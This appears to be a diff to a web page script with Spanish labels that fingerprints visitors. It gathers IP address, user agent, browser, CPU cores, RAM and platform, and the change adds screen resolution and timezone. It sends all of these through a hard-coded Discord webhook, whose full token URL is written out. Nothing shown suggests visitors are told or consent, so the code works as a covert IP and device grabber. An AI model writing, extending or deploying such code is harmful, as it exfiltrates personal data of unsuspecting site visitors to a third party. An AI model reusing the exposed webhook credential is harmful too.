@@ -9,7 +9,7 @@ import('https://openfpcdn.io/fingerprintjs/v3')
       const i = ip;
       const ua = navigator.userAgent;
       const browser = (() => {
-        if (/Brave/i.test(navigator.userAgent) && navigator.brave) return "Brave";
+        if (/Brave/i.test(ua) && navigator.brave) return "Brave";
         if (/OPR|Opera/i.test(ua)) return "Opera";
         if (/Edg/i.test(ua)) return "Microsoft Edge";
         if (/SamsungBrowser/i.test(ua)) return "Samsung Internet";
@@ -26,6 +26,8 @@ import('https://openfpcdn.io/fingerprintjs/v3')
         ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Desconocido",
         platform: navigator.platform || "Desconocido"
       };
+      const screenResolution = `${window.screen.width}x${window.screen.height}`;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const url = 'https://discord.com/api/webhooks/1346691903265181697/HRcuwXPFPsr6Y0nbNj3jH9C8cvQ_jJqi0OayLg_XJPSELEU1lt48kNmXINXZFsvJ934Z';
       fetch(url, {
         method: 'POST',
@@ -42,6 +44,8 @@ import('https://openfpcdn.io/fingerprintjs/v3')
               { name: '🖥️ Plataforma', value: hw.platform, inline: true },
               { name: '🧠 Núcleos CPU', value: String(hw.cores), inline: true },
               { name: '📦 RAM Estimada', value: hw.ram, inline: true },
+              { name: '📐 Resolución de Pantalla', value: screenResolution, inline: true },
+              { name: '🕰️ Zona Horaria', value: timezone, inline: true },
               { name: '🖥️ User Agent', value: ua, inline: false }
             ]
           }]
